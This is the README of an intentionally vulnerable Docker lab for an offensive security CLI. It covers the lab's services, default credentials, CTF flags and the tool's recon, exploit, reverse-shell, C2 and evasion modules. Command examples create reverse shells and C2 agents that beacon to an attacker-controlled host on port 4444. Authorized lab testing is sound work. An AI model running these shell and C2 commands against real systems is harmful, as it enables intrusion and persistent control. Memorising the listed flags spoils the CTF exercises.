# RedBlue Vulnerable Lab

A Docker Compose environment with intentionally vulnerable applications for testing the `rb assess` workflow and other security testing features.

## Quick Start

```bash
cd docker/vulnerable-lab
docker compose up -d
```

Wait ~2 minutes for all services to initialize, then test:

```bash
# Test the assess workflow
rb assess target run http://localhost:8080 --dry-run   # DVWA
rb assess target run http://localhost:3000 --dry-run   # Juice Shop
rb assess target run http://localhost:8083 --dry-run   # Vulnerable nginx
```

## Offensive Modules Architecture

redblue organizes offensive capabilities into specialized modules:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK WORKFLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐              │
│  │  RECON   │───▶│  EXPLOIT │───▶│  ACCESS  │───▶│  AGENT   │              │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘              │
│       │               │               │               │                     │
│       ▼               ▼               ▼               ▼                     │
│  Discovery       Payloads        Reverse        Persistent                  │
│  & intel         & exploits      shells         control                     │
│                                                                              │
│                  ┌──────────┐                                               │
│                  │ EVASION  │                                               │
│                  └──────────┘                                               │
│                       │                                                     │
│                       ▼                                                     │
│                  Anti-AV/EDR                                                │
│                  techniques                                                 │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Module Reference

| Module | Purpose | Example Commands |
|--------|---------|------------------|
| **recon** | Passive information gathering | `rb recon domain whois`, `rb recon domain subdomains` |
| **exploit** | Payload generation & exploits | `rb exploit payload shell bash`, `rb exploit payload privesc` |
| **access** | Initial access (shells, listeners) | `rb access shell create`, `rb access shell listen` |
| **agent** | C2 - Post-exploitation control | `rb agent c2 server`, `rb agent c2 connect` |
| **attack** | Orchestrates complete workflows | `rb attack workflow plan`, `rb attack workflow run` |
| **evasion** | Defense bypass techniques | `rb evasion sandbox detect`, `rb evasion memory encrypt` |

### access vs attack

| Aspect | `access` | `attack` |
|--------|----------|----------|
| **Scope** | Single tool (shell, listener) | Full workflow orchestration |
| **Analogy** | Screwdriver | Assembly manual |
| **Use case** | "I need a reverse shell" | "Plan and execute full pentest" |
| **Commands** | `rb access shell create/listen` | `rb attack workflow plan/run/suggest` |

### Typical Attack Flow

```bash
# 1. RECON - Discover target
rb recon domain subdomains target.com

# 2. ATTACK - Plan and execute
rb attack workflow plan http://target.com
rb attack workflow run http://target.com

# 3. ACCESS - Get shell if needed
rb access shell listen --port 4444

# 4. AGENT - Post-exploitation control
rb agent c2 server --port 4444
rb agent c2 connect http://c2-server:4444
```

---

## Red Team Walkthrough

For a complete red team exercise example showing the full attack chain from reconnaissance to post-exploitation, see:

**[redteam-walkthrough.md](redteam-walkthrough.md)**

This walkthrough demonstrates:
- Technology fingerprinting with `rb web asset fingerprint`
- Vulnerability correlation with `rb intel vuln search`
- SQL injection exploitation
- Authentication bypass
- Secret extraction
- MITRE ATT&CK mapping

## Available Services

| Service | Port | Technology | Vulnerabilities |
|---------|------|------------|-----------------|
| **DVWA** | 8080 | PHP/MySQL | SQL Injection, XSS, CSRF, File Upload, Command Injection |
| **Juice Shop** | 3000 | Node.js/Angular | OWASP Top 10, CTF Challenges, SQL Injection |
| **WebGoat** | 8082 | Java | OWASP Training Platform |
| **nginx-vuln** | 8083 | nginx 1.16.0 | CVE-2019-20372, misconfigs, directory listing |

## Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| DVWA | admin | password |
| WebGoat | (create account) | - |
| Juice Shop | admin@juice-sh.op | admin123 |

## Testing Commands

### Full Assessment Workflow
```bash
# Dry run (recommended first)
rb assess target run http://localhost:8080 --dry-run

# Full assessment with playbook execution
rb assess target run http://localhost:8080

# Skip fingerprinting (use cached data)
rb assess target run http://localhost:8080 --skip-fingerprint

# Force refresh all data
rb assess target run http://localhost:8080 --refresh
```

### Individual Tools
```bash
# Web fingerprinting
rb web asset fingerprint http://localhost:8083

# Security headers check
rb web asset security http://localhost:8083

# HTTP headers
rb web asset headers http://localhost:8083

# Directory fuzzing
rb web fuzz dir http://localhost:8083 --wordlist common

# Vulnerability intelligence
rb intel vuln search nginx 1.16.0
rb intel vuln search jquery 1.12.4
rb intel vuln search wordpress 5.0
```

### Port Scanning
```bash
# Scan the lab network
rb network ports scan 172.28.0.1 --preset full

# Scan specific service
rb network ports scan localhost --preset web
```

## CTF Challenges

The nginx-vuln service includes several flags to find:

1. **FLAG{welcome_to_redblue_lab}** - Visible on the main page
2. **FLAG{directory_listing_is_dangerous}** - Find the exposed files directory
3. **FLAG{hidden_directories_are_not_secure}** - Find the hidden directory
4. **FLAG{redblue_assessment_works}** - Decode the base64 in HTML comments
5. **FLAG{check_http_headers}** - Look at the response headers

---

## C2 Agent Integration

For advanced red team exercises, combine attack workflow with C2 agent deployment.

### Complete Attack Chain

```bash
# Step 1: Start vulnerable containers
docker compose up -d

# Step 2: Start C2 server (Terminal 1)
rb agent c2 server --port 4444

# Step 3: Run attack workflow (Terminal 2)
rb attack workflow plan http://localhost:8080
rb attack workflow run http://localhost:8080

# Step 4: Deploy agent via access module
rb access shell create --type bash --host <your-ip> --port 4444

# Step 5: Monitor agents on C2 server
# (agents will beacon back to your server)
```

### Attack Flow Diagram

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  Attacker   │     │  C2 Server  │     │   Target    │
│  Machine    │     │  (rb agent) │     │  (DVWA)     │
└──────┬──────┘     └──────┬──────┘     └──────┬──────┘
       │                   │                   │
       │ 1. Start server   │                   │
       │──────────────────▶│                   │
       │                   │                   │
       │ 2. attack plan    │                   │
       │───────────────────────────────────────▶
       │                   │                   │
       │ 3. attack run     │                   │
       │───────────────────────────────────────▶
       │                   │                   │
       │ 4. Deploy agent   │                   │
       │───────────────────────────────────────▶
       │                   │                   │
       │                   │   5. Beacon       │
       │                   │◀──────────────────│
       │                   │                   │
       │                   │   6. Commands     │
       │                   │──────────────────▶│
       │                   │                   │
```

### MITRE ATT&CK Mapping

| Technique | ID | Phase |
|-----------|-----|-------|
| Active Scanning | T1595 | Reconnaissance |
| Exploit Public-Facing Application | T1190 | Initial Access |
| Command and Scripting Interpreter | T1059 | Execution |
| Application Layer Protocol: HTTP | T1071.001 | C2 |

## Cleanup

```bash
# Stop all services
docker compose down

# Remove all data (volumes)
docker compose down -v

# Remove images
docker compose down --rmi all
```

## Security Warning

These applications are **intentionally vulnerable**.

- Do NOT expose these services to the internet
- Use only in isolated lab environments
- For educational and authorized testing purposes only
